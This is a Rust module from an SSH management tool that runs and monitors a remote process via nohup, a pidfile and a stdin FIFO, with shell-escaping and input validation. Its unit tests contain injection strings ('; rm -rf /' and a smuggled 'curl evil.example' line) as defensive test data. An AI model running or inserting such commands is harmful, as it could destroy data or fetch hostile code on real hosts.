//! `RemoteProcessRuntime` - a raw, non-systemd, non-Docker process kept
//! alive on a remote host over SSH, per
//! docs/APPLICATIONS_ARCHITECTURE.md Section 5.3's "nohup + PID + FIFO"
//! design (the recommended option there, over tmux - tmux needs to be
//! installed on the remote host, which isn't guaranteed).
//!
//! No new SSH machinery: everything here is `SshSession::execute_command`
//! (already used by `ssh::systemd`/`ssh::docker`) composing small shell
//! scripts, plus `write_file`'s SFTP path isn't even needed here (unlike
//! `runtime::systemd`) since nothing is written as a whole file up front.
//!
//! **State lives entirely on the remote host**, not in VibeSSH - a PID
//! file, a log file, and a named pipe for stdin, all namespaced by
//! application id inside the application's own working directory
//! (`.vibessh-app-<uuid>.{pid,log,stdin}`). This makes the runtime itself
//! stateless (unlike `LocalProcessRuntime`'s `LocalProcessManager`) and
//! means a VibeSSH restart doesn't lose track of a running application -
//! `status()` just re-reads the pidfile and checks liveness.
//!
//! **Known limitations, stated rather than hidden** (mirrors the
//! architecture doc's own callouts):
//! - No true interactive TTY - a program that behaves differently when it
//!   detects a TTY vs a pipe (e.g. disables color output) will notice.
//! - The PID file can go stale if the remote host reboots without VibeSSH
//!   knowing, or (much less likely) if the PID gets reused by an unrelated
//!   process after this one exits - `status()`/`stop()`/`kill()` only ever
//!   check "is *a* process alive at this PID", not "is it still the same
//!   process we started".
//! - No exit-code capture: a plain `nohup`'d background process's exit
//!   status isn't observable once the launching SSH exec channel closes,
//!   so `status()` can only report Running vs Stopped, never Failed (unlike
//!   `LocalProcessRuntime`, which owns the child and can `wait()` it).
//!   Capturing it reliably needs a wrapper process design that depends on
//!   shell/signal-forwarding semantics this environment has no real host to
//!   verify against - left as a documented gap rather than shipped
//!   unverified.
//! - Orphan cleanup (killing the process, removing the pidfile/log/fifo) on
//!   Application delete isn't wired anywhere yet - same gap
//!   `runtime::systemd` has, for the same reason (the `ApplicationRuntime`
//!   trait has no `destroy()`).

use std::sync::Arc;
use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::errors::{AppError, AppResult};
use crate::models::ApplicationStatus;
use crate::ssh::SshSession;

use super::{ApplicationConsole, ApplicationRuntime, HealthStatus, LogProvider, ResourceUsage, RuntimeContext};

/// What `runtime_config` deserializes into for `RuntimeType::RemoteProcess`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemoteProcessConfig {
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
}

fn parse_config(ctx: &RuntimeContext<'_>) -> AppResult<RemoteProcessConfig> {
    serde_json::from_value(ctx.runtime_config.clone())
        .map_err(|err| AppError::InvalidInput(format!("invalid remote process configuration: {err}")))
}

fn pid_file_name(application_id: Uuid) -> String {
    format!(".vibessh-app-{application_id}.pid")
}

fn log_file_name(application_id: Uuid) -> String {
    format!(".vibessh-app-{application_id}.log")
}

fn fifo_file_name(application_id: Uuid) -> String {
    format!(".vibessh-app-{application_id}.stdin")
}

fn remote_path(working_directory: &str, file_name: &str) -> String {
    format!("{}/{}", working_directory.trim_end_matches('/'), file_name)
}

fn connection_ref<'a>(ctx: &'a RuntimeContext<'_>) -> AppResult<&'a SshSession> {
    ctx.connection.as_deref().ok_or_else(|| AppError::Internal("RemoteProcessRuntime requires a connection".into()))
}

fn connection_arc(ctx: &RuntimeContext<'_>) -> AppResult<Arc<SshSession>> {
    ctx.connection.clone().ok_or_else(|| AppError::Internal("RemoteProcessRuntime requires a connection".into()))
}

/// A raw newline could let a value that was meant to be one shell token or
/// one env value inject an extra shell statement once it lands in a
/// multi-line script - rejected outright rather than encoded, same stance
/// `runtime::systemd` takes for unit-file values.
fn reject_newlines(value: &str, field: &str) -> AppResult<()> {
    if value.contains('\n') || value.contains('\r') {
        return Err(AppError::InvalidInput(format!("{field} can't contain a newline")));
    }
    Ok(())
}

/// POSIX single-quote shell escaping: wraps in `'...'` and replaces every
/// embedded `'` with `'\''` (close the quote, an escaped literal quote,
/// reopen the quote) - the standard, unambiguous way to pass an arbitrary
/// string as one shell word regardless of its contents.
fn shell_quote(value: &str) -> String {
    let mut quoted = String::with_capacity(value.len() + 2);
    quoted.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            quoted.push_str("'\\''");
        } else {
            quoted.push(ch);
        }
    }
    quoted.push('\'');
    quoted
}

/// POSIX environment variable name rule - also guards against a key
/// containing `=` or whitespace, which would break the `KEY=value` token
/// `env` expects unquoted.
fn is_valid_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_') && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The script `start()`/`restart()` run. `exec 3<>{fifo}` opens the FIFO
/// read-write on fd 3 in *this* shell - unlike a plain `<{fifo}` open,
/// this doesn't block waiting for another writer, which is what makes it
/// possible to hand the not-yet-connected FIFO to the backgrounded command
/// as its stdin (`<&3 3<&-`: duplicate fd 3 onto fd 0, then close the
/// now-redundant fd 3) without a chicken-and-egg deadlock. The backgrounded
/// process inherits fd 0 as a live reference to the pipe, so later writes
/// from a fresh SSH command (`RemoteConsole::write`) succeed immediately
/// instead of blocking for a reader.
fn build_start_script(ctx: &RuntimeContext<'_>, config: &RemoteProcessConfig) -> AppResult<String> {
    reject_newlines(&config.command, "the command")?;
    for arg in &config.args {
        reject_newlines(arg, "an argument")?;
    }

    let working_directory = shell_quote(&ctx.application.working_directory);
    let fifo = shell_quote(&fifo_file_name(ctx.application.id));
    let log = shell_quote(&log_file_name(ctx.application.id));
    let pid_file = shell_quote(&pid_file_name(ctx.application.id));

    let mut command_line = shell_quote(&config.command);
    for arg in &config.args {
        command_line.push(' ');
        command_line.push_str(&shell_quote(arg));
    }

    let mut env_prefix = String::new();
    for env in ctx.environment {
        if !is_valid_env_key(&env.key) {
            return Err(AppError::InvalidInput(format!("'{}' isn't a valid environment variable name", env.key)));
        }
        reject_newlines(&env.value, &format!("the '{}' environment variable", env.key))?;
        env_prefix.push_str(&env.key);
        env_prefix.push('=');
        env_prefix.push_str(&shell_quote(&env.value));
        env_prefix.push(' ');
    }

    Ok(format!(
        "cd {working_directory} || exit 1\n\
         mkfifo {fifo} 2>/dev/null\n\
         exec 3<>{fifo}\n\
         {env_prefix}nohup {command_line} <&3 3<&- >{log} 2>&1 &\n\
         echo $! > {pid_file}\n\
         disown\n\
         cat {pid_file}\n"
    ))
}

async fn read_pid_file(connection: &SshSession, ctx: &RuntimeContext<'_>) -> AppResult<Option<u32>> {
    let path = remote_path(&ctx.application.working_directory, &pid_file_name(ctx.application.id));
    let output = connection.execute_command(&format!("cat {} 2>/dev/null", shell_quote(&path))).await?;
    Ok(output.stdout.trim().parse::<u32>().ok())
}

async fn is_process_alive(connection: &SshSession, pid: u32) -> AppResult<bool> {
    let output = connection.execute_command(&format!("kill -0 {pid} 2>/dev/null")).await?;
    Ok(output.exit_code == 0)
}

async fn wait_until_stopped(connection: &SshSession, pid: u32, timeout: Duration) {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        match is_process_alive(connection, pid).await {
            Ok(true) => tokio::time::sleep(Duration::from_millis(300)).await,
            _ => return,
        }
    }
}

/// `ps -o pcpu=,rss=,etimes= -p <pid>`'s output: three whitespace-separated
/// numbers - CPU%, RSS in KiB, and elapsed time in seconds (`etimes`, so no
/// separate "when did this start" tracking is needed the way
/// `LocalProcessRuntime` needs its own `Instant`).
fn parse_ps_output(output: &str) -> (Option<f32>, Option<u64>, Option<u64>) {
    let mut fields = output.split_whitespace();
    let cpu_percent = fields.next().and_then(|f| f.parse::<f32>().ok());
    let ram_bytes = fields.next().and_then(|f| f.parse::<u64>().ok()).map(|kb| kb * 1024);
    let uptime_seconds = fields.next().and_then(|f| f.parse::<u64>().ok());
    (cpu_percent, ram_bytes, uptime_seconds)
}

pub struct RemoteProcessRuntime;

impl RemoteProcessRuntime {
    pub fn new() -> Self {
        Self
    }
}

impl Default for RemoteProcessRuntime {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait::async_trait]
impl ApplicationRuntime for RemoteProcessRuntime {
    async fn validate(&self, ctx: &RuntimeContext<'_>) -> AppResult<()> {
        let connection = connection_ref(ctx)?;
        let config = parse_config(ctx)?;
        if config.command.trim().is_empty() {
            return Err(AppError::InvalidInput("no command configured for this application".into()));
        }
        // Exercises every escaping/validation rule up front.
        build_start_script(ctx, &config)?;

        let output = connection.execute_command(&format!("test -d {}", shell_quote(&ctx.application.working_directory))).await?;
        if output.exit_code != 0 {
            return Err(AppError::InvalidInput(format!(
                "working directory '{}' does not exist on the remote host",
                ctx.application.working_directory
            )));
        }
        Ok(())
    }

    async fn start(&self, ctx: &RuntimeContext<'_>) -> AppResult<()> {
        let connection = connection_ref(ctx)?;
        let config = parse_config(ctx)?;

        if let Some(pid) = read_pid_file(connection, ctx).await? {
            if is_process_alive(connection, pid).await? {
                return Err(AppError::InvalidInput("this application is already running".into()));
            }
        }

        let script = build_start_script(ctx, &config)?;
        let output = connection.execute_command(&script).await?;
        output.stdout.trim().parse::<u32>().map_err(|_| {
            let detail = output.stderr.trim();
            if detail.is_empty() {
                AppError::Connection("couldn't start the application - no PID was reported".to_string())
            } else {
                AppError::Connection(format!("couldn't start the application: {detail}"))
            }
        })?;
        Ok(())
    }

    /// Unlike `runtime::systemd::stop` (where systemd's own `stop` verb is
    /// already synchronously graceful), sending a bare `kill -TERM` over
    /// one SSH exec is fire-and-forget by default - `graceful` genuinely
    /// controls whether this call waits (bounded, 10s) for the process to
    /// actually exit before returning, same interpretation
    /// `LocalProcessRuntime::stop` uses.
    async fn stop(&self, ctx: &RuntimeContext<'_>, graceful: bool) -> AppResult<()> {
        let connection = connection_ref(ctx)?;
        let Some(pid) = read_pid_file(connection, ctx).await? else {
            return Err(AppError::InvalidInput("this application isn't running".into()));
        };
        if !is_process_alive(connection, pid).await? {
            return Ok(());
        }
        connection.execute_command(&format!("kill -TERM {pid}")).await?;
        if graceful {
            wait_until_stopped(connection, pid, Duration::from_secs(10)).await;
        }
        Ok(())
    }

    async fn restart(&self, ctx: &RuntimeContext<'_>) -> AppResult<()> {
        let connection = connection_ref(ctx)?;
        if let Some(pid) = read_pid_file(connection, ctx).await? {
            if is_process_alive(connection, pid).await? {
                connection.execute_command(&format!("kill -KILL {pid}")).await?;
                wait_until_stopped(connection, pid, Duration::from_secs(5)).await;
            }
        }
        self.start(ctx).await
    }

    async fn kill(&self, ctx: &RuntimeContext<'_>) -> AppResult<()> {
        let connection = connection_ref(ctx)?;
        let Some(pid) = read_pid_file(connection, ctx).await? else {
            return Err(AppError::InvalidInput("this application isn't running".into()));
        };
        if is_process_alive(connection, pid).await? {
            connection.execute_command(&format!("kill -KILL {pid}")).await?;
            wait_until_stopped(connection, pid, Duration::from_secs(5)).await;
        }
        Ok(())
    }

    async fn status(&self, ctx: &RuntimeContext<'_>) -> AppResult<ApplicationStatus> {
        let connection = connection_ref(ctx)?;
        match read_pid_file(connection, ctx).await? {
            Some(pid) if is_process_alive(connection, pid).await? => Ok(ApplicationStatus::Running),
            // No pidfile (never started) or a dead PID - Stopped either way.
            // Never Failed: see the module doc comment's "no exit-code
            // capture" limitation.
            _ => Ok(ApplicationStatus::Stopped),
        }
    }

    async fn resource_usage(&self, ctx: &RuntimeContext<'_>) -> AppResult<ResourceUsage> {
        let empty = ResourceUsage { cpu_percent: None, ram_bytes: None, uptime_seconds: None };
        let connection = connection_ref(ctx)?;
        let Some(pid) = read_pid_file(connection, ctx).await? else {
            return Ok(empty);
        };
        if !is_process_alive(connection, pid).await? {
            return Ok(empty);
        }
        let output = connection.execute_command(&format!("ps -o pcpu=,rss=,etimes= -p {pid}")).await?;
        let (cpu_percent, ram_bytes, uptime_seconds) = parse_ps_output(&output.stdout);
        Ok(ResourceUsage { cpu_percent, ram_bytes, uptime_seconds })
    }

    async fn health_check(&self, ctx: &RuntimeContext<'_>) -> AppResult<HealthStatus> {
        // No Failed state to map to Unhealthy here (see the module doc
        // comment) - only Running is ever reported as more than Unknown.
        match self.status(ctx).await? {
            ApplicationStatus::Running => Ok(HealthStatus::Healthy),
            _ => Ok(HealthStatus::Unknown),
        }
    }

    async fn console(&self, ctx: &RuntimeContext<'_>) -> AppResult<Option<Box<dyn ApplicationConsole>>> {
        let probe = connection_ref(ctx)?;
        let Some(pid) = read_pid_file(probe, ctx).await? else {
            return Ok(None);
        };
        if !is_process_alive(probe, pid).await? {
            return Ok(None);
        }
        let connection = connection_arc(ctx)?;
        let fifo_path = remote_path(&ctx.application.working_directory, &fifo_file_name(ctx.application.id));
        Ok(Some(Box::new(RemoteConsole { connection, fifo_path })))
    }

    async fn logs(&self, ctx: &RuntimeContext<'_>) -> AppResult<Box<dyn LogProvider>> {
        let connection = connection_arc(ctx)?;
        let log_path = remote_path(&ctx.application.working_directory, &log_file_name(ctx.application.id));
        Ok(Box::new(RemoteLogs { connection, log_path }))
    }
}

struct RemoteConsole {
    connection: Arc<SshSession>,
    fifo_path: String,
}

#[async_trait::async_trait]
impl ApplicationConsole for RemoteConsole {
    async fn write(&self, input: &str) -> AppResult<()> {
        reject_newlines(input, "console input")?;
        let output = self
            .connection
            .execute_command(&format!("printf '%s\\n' {} > {}", shell_quote(input), shell_quote(&self.fifo_path)))
            .await?;
        if output.exit_code != 0 {
            let detail = output.stderr.trim();
            let detail = if detail.is_empty() { "couldn't write to the application's console".to_string() } else { detail.to_string() };
            return Err(AppError::Connection(detail));
        }
        Ok(())
    }

    fn close(&self) {
        // The remote process isn't tied to a console UI's lifecycle -
        // closing the console must not stop it, same reasoning as
        // `LocalProcessRuntime`'s console.
    }

    fn supports_input(&self) -> bool {
        true
    }
}

struct RemoteLogs {
    connection: Arc<SshSession>,
    log_path: String,
}

#[async_trait::async_trait]
impl LogProvider for RemoteLogs {
    async fn tail(&self, max_lines: u32) -> AppResult<Vec<String>> {
        let max_lines = max_lines.clamp(1, 5000);
        let output = self.connection.execute_command(&format!("tail -n {max_lines} {} 2>/dev/null", shell_quote(&self.log_path))).await?;
        Ok(output.stdout.lines().map(str::to_string).collect())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Application, EnvironmentVariable, HealthCheckType, RuntimeType};

    fn stub_application(id: Uuid) -> Application {
        Application {
            id,
            server_id: Some(Uuid::new_v4()),
            name: "My App".to_string(),
            description: None,
            blueprint_id: "generic".to_string(),
            blueprint_version: 1,
            runtime_type: RuntimeType::RemoteProcess,
            working_directory: "/srv/my-app".to_string(),
            status: ApplicationStatus::Unknown,
            last_status_check_at: None,
            health_check_type: HealthCheckType::Process,
            health_check_port_id: None,
            health_check_http_path: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn shell_quote_escapes_embedded_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("has space"), "'has space'");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote("; rm -rf /"), "'; rm -rf /'");
    }

    #[test]
    fn is_valid_env_key_rejects_equals_and_leading_digits() {
        assert!(is_valid_env_key("PORT"));
        assert!(is_valid_env_key("_PRIVATE_VAR"));
        assert!(!is_valid_env_key("PORT=8080"));
        assert!(!is_valid_env_key("8080PORT"));
        assert!(!is_valid_env_key(""));
    }

    #[test]
    fn file_names_are_namespaced_by_application_id() {
        let id = Uuid::parse_str("11111111-2222-3333-4444-555555555555").unwrap();
        assert_eq!(pid_file_name(id), ".vibessh-app-11111111-2222-3333-4444-555555555555.pid");
        assert_eq!(log_file_name(id), ".vibessh-app-11111111-2222-3333-4444-555555555555.log");
        assert_eq!(fifo_file_name(id), ".vibessh-app-11111111-2222-3333-4444-555555555555.stdin");
    }

    #[test]
    fn remote_path_joins_without_a_double_slash() {
        assert_eq!(remote_path("/srv/my-app", "x.pid"), "/srv/my-app/x.pid");
        assert_eq!(remote_path("/srv/my-app/", "x.pid"), "/srv/my-app/x.pid");
    }

    #[test]
    fn build_start_script_wires_the_fifo_env_and_pidfile() {
        let application = stub_application(Uuid::new_v4());
        let config = RemoteProcessConfig { command: "/usr/bin/java".into(), args: vec!["-jar".into(), "server.jar".into()] };
        let environment = vec![EnvironmentVariable { key: "PORT".into(), value: "25565".into() }];
        let config_value = serde_json::to_value(&config).unwrap();
        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &environment, connection: None };

        let script = build_start_script(&ctx, &config).unwrap();

        assert!(script.contains("cd '/srv/my-app' || exit 1"));
        assert!(script.contains("mkfifo "));
        assert!(script.contains("exec 3<>"));
        assert!(script.contains("PORT='25565' nohup '/usr/bin/java' '-jar' 'server.jar' <&3 3<&-"));
        assert!(script.contains("echo $! >"));
        assert!(script.contains("disown"));
    }

    #[test]
    fn build_start_script_rejects_a_newline_in_an_argument() {
        let application = stub_application(Uuid::new_v4());
        let config = RemoteProcessConfig { command: "/bin/sh".into(), args: vec!["-c\ncurl evil.example".into()] };
        let config_value = serde_json::to_value(&config).unwrap();
        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &[], connection: None };

        assert!(build_start_script(&ctx, &config).is_err());
    }

    #[test]
    fn build_start_script_rejects_an_invalid_environment_key() {
        let application = stub_application(Uuid::new_v4());
        let config = RemoteProcessConfig { command: "/usr/bin/java".into(), args: vec![] };
        let environment = vec![EnvironmentVariable { key: "NOT VALID".into(), value: "x".into() }];
        let config_value = serde_json::to_value(&config).unwrap();
        let ctx = RuntimeContext { application: &application, runtime_config: &config_value, environment: &environment, connection: None };

        assert!(build_start_script(&ctx, &config).is_err());
    }

    #[test]
    fn parse_ps_output_reads_all_three_fields() {
        assert_eq!(parse_ps_output(" 12.3  4096  90\n"), (Some(12.3), Some(4096 * 1024), Some(90)));
        assert_eq!(parse_ps_output(""), (None, None, None));
    }

    #[tokio::test]
    async fn methods_that_need_a_connection_fail_cleanly_without_one() {
        let application = stub_application(Uuid::new_v4());
        let config = serde_json::json!({ "command": "/usr/bin/java", "args": [] });
        let ctx = RuntimeContext { application: &application, runtime_config: &config, environment: &[], connection: None };
        let runtime = RemoteProcessRuntime::new();

        assert!(matches!(runtime.validate(&ctx).await, Err(AppError::Internal(_))));
        assert!(matches!(runtime.start(&ctx).await, Err(AppError::Internal(_))));
        assert!(matches!(runtime.status(&ctx).await, Err(AppError::Internal(_))));
        assert!(matches!(runtime.logs(&ctx).await, Err(AppError::Internal(_))));
    }
}
